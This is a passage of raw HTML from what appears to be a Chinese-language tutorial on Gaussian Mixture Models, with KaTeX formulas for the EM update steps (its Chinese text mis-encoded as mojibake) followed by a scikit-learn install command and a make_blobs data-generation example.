class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.4231em;margin-left:-0.0556em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.413em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathbf">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.3478em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></div>
<ul>
<li><strong>æ›´æ–°æ··åˆæƒé‡</strong> <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Ï€</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">\pi_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Ï€</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>ï¼ˆæ ‡é‡ï¼‰</li>
</ul>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>Ï€</mi><mi>j</mi></msub><mo>=</mo><mfrac><mn>1</mn><mi>m</mi></mfrac><munderover><mo>âˆ‘</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><msubsup><mi>Î³</mi><mi>j</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msubsup></mrow><annotation encoding="application/x-tex">\pi_{j} = \frac{1}{m} \sum_{i=1}^{m}  \gamma_{j}^{(i)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Ï€</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">m</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"/><span><span class="mop op-symbol large-op">âˆ‘</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.05556em;">Î³</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.4231em;margin-left:-0.0556em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.413em;"><span/></span></span></span></span></span></span></span></span></span></div>
<ul>
<li><strong>æ›´æ–°åæ–¹å·®</strong> <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="normal">Î£</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">\Sigma_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord">Î£</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>ï¼ˆçŸ©é˜µï¼‰</li>
</ul>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi mathvariant="normal">Î£</mi><mi>j</mi></msub><mo>=</mo><mfrac><mrow><mstyle scriptlevel="0" displaystyle="false"><msubsup><mo>âˆ‘</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></msubsup></mstyle><msubsup><mi>Î³</mi><mi>j</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msubsup><mo stretchy="false">(</mo><msup><mi mathvariant="bold">x</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup><mo>âˆ’</mo><msub><mi mathvariant="bold-italic">Î¼</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msup><mi mathvariant="bold">x</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup><mo>âˆ’</mo><msub><mi mathvariant="bold-italic">Î¼</mi><mi>j</mi></msub><msup><mo stretchy="false">)</mo><mi>T</mi></msup></mrow><mrow><mstyle scriptlevel="0" displaystyle="false"><msubsup><mo>âˆ‘</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></msubsup></mstyle><msubsup><mi>Î³</mi><mi>j</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msubsup></mrow></mfrac></mrow><annotation encoding="application/x-tex">\Sigma_{j} = \frac{{\textstyle \sum_{i=1}^{m}} \gamma_{j}^{(i)}(\mathbf{x}^{(i)}-\boldsymbol{\mu}_{j})(\mathbf{x}^{(i)}-\boldsymbol{\mu}_{j})^{T}}{ {\textstyle \sum_{i=1}^{m}} \gamma_{j}^{(i)}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord">Î£</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3.1955em;vertical-align:-1.3478em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8478em;"><span style="top:-2.11em;"><span class="pstrut" style="height:3.0448em;"/><span class="mord"><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8043em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05556em;">Î³</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.4231em;margin-left:-0.0556em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.413em;"><span/></span></span></span></span></span></span></span><span style="top:-3.2748em;"><span class="pstrut" style="height:3.0448em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.8478em;"><span class="pstrut" style="height:3.0448em;"/><span class="mord"><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8043em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05556em;">Î³</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.4231em;margin-left:-0.0556em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.413em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathbf">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord"><span class="mord"><span class="mord boldsymbol">Î¼</span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2175em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3802em;"><span/></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathbf">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord"><span class="mord"><span class="mord boldsymbol">Î¼</span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2175em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3802em;"><span/></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.3478em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></div>
<p>é‡å¤æ‰§è¡ŒEæ­¥å’ŒMæ­¥ï¼Œä¸æ–­æ›´æ–°<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="normal">Î£</mi><mi>j</mi></msub><mo separator="true">,</mo><msub><mi mathvariant="bold-italic">Î¼</mi><mi>j</mi></msub><mo separator="true">,</mo><msub><mi>Ï€</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">\Sigma_{j},\boldsymbol{\mu}_{j},\pi_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0636em;vertical-align:-0.3802em;"/><span class="mord"><span class="mord">Î£</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord"><span class="mord"><span class="mord boldsymbol">Î¼</span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2175em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3802em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Ï€</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>ï¼Œé€šå¸¸è¿­ä»£ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>20</mn></mrow><annotation encoding="application/x-tex">20</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">20</span></span></span></span></span>-<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>100</mn></mrow><annotation encoding="application/x-tex">100</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">100</span></span></span></span></span> æ¬¡ï¼Œæœ€ç»ˆä¼šæ”¶æ•›åˆ°ä¸€ä¸ªå±€éƒ¨æœ€ä¼˜è§£ã€‚</p>
<p>æœ€ç»ˆæˆ‘ä»¬å¾—åˆ°äº†çš„ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span> ä¸ªé«˜æ–¯åˆ†å¸ƒ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">N</mi><mo stretchy="false">(</mo><mi mathvariant="bold">x</mi><mo>âˆ£</mo><msub><mi mathvariant="bold-italic">Î¼</mi><mi>j</mi></msub><mo separator="true">,</mo><msub><mi mathvariant="normal">Î£</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{N}(\mathbf{x} \mid \boldsymbol{\mu}_j, \Sigma_j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathcal" style="margin-right:0.14736em;">N</span><span class="mopen">(</span><span class="mord mathbf">x</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">âˆ£</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.1302em;vertical-align:-0.3802em;"/><span class="mord"><span class="mord"><span class="mord"><span class="mord boldsymbol">Î¼</span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2175em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3802em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord">Î£</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span></span>åŠå…¶æƒé‡<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Ï€</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">\pi_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Ï€</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>ï¼Œä»¥åŠæ¯ä¸ªæ ·æœ¬å¯¹å„ä¸ªé«˜æ–¯åˆ†å¸ƒçš„éš¶å±åº¦ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>Î³</mi><mi>j</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msubsup></mrow><annotation encoding="application/x-tex">\gamma_j^{(i)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.4578em;vertical-align:-0.413em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.05556em;">Î³</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.4231em;margin-left:-0.0556em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.413em;"><span/></span></span></span></span></span></span></span></span></span>ã€‚è¿™äº›å‚æ•°å®Œæ•´åˆ»ç”»äº†æ‰€æœ‰æ•°æ®çš„æ··åˆåˆ†å¸ƒã€‚</p>
<p>å¦‚æœä½ ç†è§£äº†ä¸Šè¿°æ•°å­¦æµç¨‹ï¼Œé‚£ä¹ˆå³ä½¿ä¸ä½¿ç”¨ç°æˆçš„GMMåº“ï¼Œä»…ç”¨Pythonå’ŒNumPyä¹Ÿèƒ½å®ç°ä¸€ä¸ªå®Œæ•´çš„GMMèšç±»ç®—æ³•ã€‚ä¸‹é¢å°†å±•ç¤ºå¦‚ä½•è°ƒç”¨æˆç†Ÿçš„æœºå™¨å­¦ä¹ åº“æ¥ä½¿ç”¨GMMç®—æ³•ã€‚</p>
<p>é¦–å…ˆï¼Œç¡®ä¿å·²å®‰è£…å¿…è¦çš„Pythonåº“ã€‚å¦‚æœå°šæœªå®‰è£…<code>Scikit-learn</code>ï¼Œå¯é€šè¿‡ä»¥ä¸‹å‘½ä»¤å®‰è£…ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">pip install scikit-learn
</code></pre>
<p>ä¸ºäº†æ¼”ç¤ºGMMç®—æ³•çš„åº”ç”¨ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªåˆé€‚çš„æ•°æ®é›†ã€‚å› ä¸ºæ²¡æœ‰ç°æˆçš„çœŸå®æ•°æ®é›†ï¼Œè¿™é‡Œå°±ä½¿ç”¨<code>make_blobs</code>å‡½æ•°ç”Ÿæˆä¸€ä¸ªéšæœºçš„åˆæˆæ•°æ®é›†ã€‚è¿™ä¸ªå‡½æ•°ç‰¹åˆ«é€‚åˆç”Ÿæˆç¬¦åˆæ··åˆé«˜æ–¯åˆ†å¸ƒçš„æ•°æ®ï¼Œå› ä¸ºå®ƒæœ¬èº«å°±æ˜¯é€šè¿‡å åŠ å¤šä¸ªé«˜æ–¯åˆ†å¸ƒæ¥åˆ›å»ºæ•°æ®çš„ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
<span class="hljs-keyword">from</span> sklearn.datasets <span class="hljs-keyword">import</span> make_blobs

<span class="hljs-comment"># ç”Ÿæˆç¤ºä¾‹æ•°æ®</span>
<span class="hljs-comment"># n_samples: æ ·æœ¬æ•°é‡ï¼ˆ500ä¸ªï¼‰</span>
<span class="hljs-comment"># n_features: ç‰¹å¾ç»´åº¦ï¼ˆ3ç»´ï¼‰</span>
<span class="hljs-comment"># centers: èšç±»ä¸­å¿ƒæ•°é‡ï¼ˆ4ä¸ªï¼‰</span>
<span class="hljs-comment"># cluster_std: æ¯ä¸ªç°‡çš„æ ‡å‡†å·®ï¼ˆæ§åˆ¶ç°‡çš„ç´§å¯†åº¦ï¼‰</span>
<span class="hljs-comment"># random_state: éšæœºç§å­ï¼Œç¡®ä¿ç»“æœå¯å¤ç°</span>
dataset, _ = make_blobs(
    n_samples=<span class="hljs-number">500</span>, 
    n_features=<span class="hljs-number">3</span>, 
    centers=<span class="hljs-number">4</span>, 
    cluster_std=<span class="hljs-number">1.8</span>, 
    random_state=<span class="hljs-number">3212</span>
)

<span class="hljs-built_in">print</span>(dataset.shape)	<span class="hljs-comment"># æŸ¥çœ‹æ•°æ®çš„å½¢çŠ¶</span>
<span class="hljs-built_in">print</span>(dataset[:<span class="hljs-number">10</span>])	<span class="hljs-comment"># æŸ¥çœ‹å‰10ä¸ªæ•°æ®</span>

<span class="hljs-comment"># === è¾“å‡º ===</span>
(<span class="hljs-number">500</span>,<span class="hljs-number">3</span>)

[[ -<span class="hljs-number">2.2167599</span> ,  -<span class="hljs-number">7.11603166</span>,   <span class="hljs-number">3.99062792</span>],
 [ -<span class="hljs-number">1.90878361</span>,  -<span class="hljs-number">4.10948361</span>,   <span class="hljs-number">5.1927847</span> ],
 [ -<span class="hljs-number">1.96540003</span>,  -<span class="hljs-number">6.17016357</span>,   <span class="hljs-number">2.79308236</span>],
 [ -<span class="hljs-number">1.90406637</span>,   <span class="hljs-number">0.73862831</span>, -<span class="hljs-number">10.0718729</span> ],
 [ -<span class="hljs-number">9.08810591</span>,  -<span class="hljs-number">6.24574275</span>,  -<span class="hljs-number">1.24825942</span>],
 [ -<span class="hljs-number">6.03737854</span>,  -<span class="hljs-number">6.50248559</span>,   <span class="hljs-number">2.76654161</span>],
 [ -<span class="hljs-number">1.46453584</span>,  -<span class="hljs-number">8.28078741</span>,   <span class="hljs-number">2.93290504</span>],
 [ -<span class="hljs-number">1.87337298</span>,  -<span class="hljs-number">5.32761017</span>,   <span class="hljs-number">3.79653868</span>],
 [  <span class="hljs-number">6.21321387</span>,   <span class="hljs-number">4.5978286</span> ,  -<span class="hljs-number">5.75274046</span>],
 [-<span class="hljs-number">10.68329327</span>, -<span class="hljs-number">10.08210729</span>,  -<span class="hljs-number">1.48406785</span>]]
</code></pre>
